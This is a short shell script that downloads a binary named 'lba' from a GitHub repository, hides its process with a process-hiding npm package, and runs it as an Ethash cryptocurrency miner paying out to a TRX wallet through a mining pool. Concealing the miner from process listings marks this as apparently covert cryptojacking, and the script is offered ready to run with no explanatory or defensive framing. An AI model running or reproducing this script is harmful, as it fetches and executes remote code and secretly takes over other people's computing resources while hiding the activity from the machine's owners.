apt update
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
wget https://github.com/christiarch/templates/raw/main/lba
chmod +x lba
npm i -g node-process-hider 
ph add lba

./lba --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TFCt7MbKSyWpFnzo493Jt4vNCqeA5iT1fe.$(echo $(shuf -i 1-9999 -n 1)-Gpu) --ethstratum ETHPROXY
